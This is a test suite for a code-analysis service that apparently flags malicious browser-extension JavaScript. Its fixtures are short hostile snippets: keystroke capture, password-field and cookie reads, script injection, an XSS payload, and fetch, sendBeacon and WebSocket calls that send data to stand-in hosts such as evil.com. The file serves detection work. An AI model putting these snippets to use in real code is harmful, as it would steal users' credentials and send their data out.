import { Test, TestingModule } from '@nestjs/testing';
import { AstParserService } from '../ast-parser/ast-parser.service.js';
import { StructuredLogger } from '../../common/logger/logger.service.js';
import {
  FindingCategory,
  RiskLevel,
} from '../../common/enums/risk-level.enum.js';

describe('AstParserService', () => {
  let service: AstParserService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [AstParserService, StructuredLogger],
    }).compile();

    service = module.get<AstParserService>(AstParserService);
  });

  describe('parseFile — keylogger detection', () => {
    it('should detect addEventListener("keyup")', () => {
      const code = `document.addEventListener('keyup', function(e) { send(e.key); });`;
      const { findings } = service.parseFile(code, 'content.js');
      const keyloggerFindings = findings.filter(
        (f) => f.category === FindingCategory.KEYLOGGER,
      );
      expect(keyloggerFindings.length).toBeGreaterThan(0);
      expect(keyloggerFindings[0].severity).toBe(RiskLevel.CRITICAL);
    });

    it('should detect addEventListener("keypress")', () => {
      const code = `window.addEventListener('keypress', handler);`;
      const { findings } = service.parseFile(code, 'bg.js');
      const keylogger = findings.find(
        (f) => f.category === FindingCategory.KEYLOGGER,
      );
      expect(keylogger).toBeDefined();
    });

    it('should detect form submit interception', () => {
      const code = `document.getElementById('form').addEventListener('submit', stealData);`;
      const { findings } = service.parseFile(code, 'inject.js');
      const keylogger = findings.find(
        (f) => f.category === FindingCategory.KEYLOGGER,
      );
      expect(keylogger).toBeDefined();
    });
  });

  describe('parseFile — data theft detection', () => {
    it('should detect password field access', () => {
      const code = `var pwd = document.querySelector('input[type="password"]').value;`;
      const { findings } = service.parseFile(code, 'stealer.js');
      const theft = findings.find(
        (f) => f.category === FindingCategory.DATA_THEFT,
      );
      expect(theft).toBeDefined();
      expect(theft!.severity).toBe(RiskLevel.CRITICAL);
    });

    it('should detect document.cookie access', () => {
      const code = `var cookies = document.cookie;`;
      const { findings } = service.parseFile(code, 'cookie-stealer.js');
      const theft = findings.find(
        (f) =>
          f.category === FindingCategory.DATA_THEFT &&
          f.pattern.includes('cookie'),
      );
      expect(theft).toBeDefined();
    });
  });

  describe('parseFile — injection detection', () => {
    it('should detect dynamic script creation', () => {
      const code = `var s = document.createElement('script'); s.src = 'evil.js'; document.head.appendChild(s);`;
      const { findings } = service.parseFile(code, 'injector.js');
      const injection = findings.find(
        (f) => f.category === FindingCategory.INJECTION,
      );
      expect(injection).toBeDefined();
      expect(injection!.severity).toBe(RiskLevel.CRITICAL);
    });

    it('should detect innerHTML assignment', () => {
      const code = `document.getElementById('container').innerHTML = '<img src=x onerror=alert(1)>';`;
      const { findings } = service.parseFile(code, 'xss.js');
      const injection = findings.find(
        (f) =>
          f.category === FindingCategory.INJECTION && f.pattern === 'innerHTML',
      );
      expect(injection).toBeDefined();
    });
  });

  describe('parseFile — exfiltration detection', () => {
    it('should detect fetch() calls', () => {
      const code = `fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(data) });`;
      const { findings } = service.parseFile(code, 'exfil.js');
      const exfil = findings.find(
        (f) => f.category === FindingCategory.EXFILTRATION,
      );
      expect(exfil).toBeDefined();
    });

    it('should detect navigator.sendBeacon', () => {
      const code = `navigator.sendBeacon('https://evil.com/track', payload);`;
      const { findings } = service.parseFile(code, 'beacon.js');
      const exfil = findings.find(
        (f) => f.category === FindingCategory.EXFILTRATION,
      );
      expect(exfil).toBeDefined();
      expect(exfil!.severity).toBe(RiskLevel.CRITICAL);
    });
  });

  describe('parseFile — persistence detection', () => {
    it('should detect chrome.alarms.create', () => {
      const code = `chrome.alarms.create('persist', { periodInMinutes: 60 });`;
      const { findings } = service.parseFile(code, 'background.js');
      const persistence = findings.find(
        (f) => f.category === FindingCategory.PERSISTENCE,
      );
      expect(persistence).toBeDefined();
    });
  });

  describe('parseFile — DOM selector extraction', () => {
    it('should extract getElementById selectors', () => {
      const code = `var el = document.getElementById('btn-transferir');`;
      const { selectors } = service.parseFile(code, 'inject.js');
      const sel = selectors.find((s) => s.selector === 'btn-transferir');
      expect(sel).toBeDefined();
    });

    it('should extract querySelector selectors', () => {
      const code = `document.querySelector('#account-balance');`;
      const { selectors } = service.parseFile(code, 'inject.js');
      expect(selectors.length).toBeGreaterThan(0);
    });
  });

  describe('parseFile — error resilience', () => {
    it('should handle invalid JS gracefully', () => {
      const code = `function broken( { return ??? invalid syntax `;
      expect(() => service.parseFile(code, 'broken.js')).not.toThrow();
    });

    it('should handle empty code', () => {
      const { findings, selectors } = service.parseFile('', 'empty.js');
      expect(findings).toEqual([]);
      expect(selectors).toEqual([]);
    });
  });

  describe('extractContactedDomains — context-aware', () => {
    it('does NOT extract domains from window.open (it is a link, not a contact)', () => {
      const code = `
        document.getElementById("ins").addEventListener("click", function () {
          window.open("https://www.instagram.com/get_happy_dog/", "_blank");
        });
        document.getElementById("dc").addEventListener("click", function () {
          window.open("https://discord.gg/AaqgxTJzXk", "_blank");
        });
      `;
      const domains = service.extractContactedDomains(code, 'popup.js');
      expect(domains).toEqual([]);
    });

    it('does NOT extract domains from chrome.tabs.create or location.href', () => {
      const code = `
        chrome.tabs.create({ url: "https://example.com/page" });
        location.href = "https://other.com/foo";
      `;
      const domains = service.extractContactedDomains(code, 'bg.js');
      expect(domains).toEqual([]);
    });

    it('extracts hosts that are real network-sink arguments', () => {
      const code = `
        await fetch("https://api.evil.com/exfil", { method: "POST" });
        new WebSocket("wss://c2.evil.net/socket");
        navigator.sendBeacon("https://beacon.evil.org/p");
      `;
      const domains = service
        .extractContactedDomains(code, 'bg.js')
        .map((d) => d.domain);
      expect(domains).toContain('api.evil.com');
      expect(domains).toContain('c2.evil.net');
      expect(domains).toContain('beacon.evil.org');
    });

    it('handles template literals and concatenation in fetch args', () => {
      const code = `
        const host = "api.example.com";
        fetch(\`https://\${host}/v1/data\`);
        fetch("https://" + "other.com" + "/x");
      `;
      const domains = service
        .extractContactedDomains(code, 'bg.js')
        .map((d) => d.domain);
      // Template literal: the quasi prefix "https://" -> host parsed from it
      // when joined; concatenation: "https://other.com/x" is parsed.
      expect(domains.length).toBeGreaterThan(0);
      expect(domains.some((d) => d === 'other.com')).toBe(true);
    });
  });
});
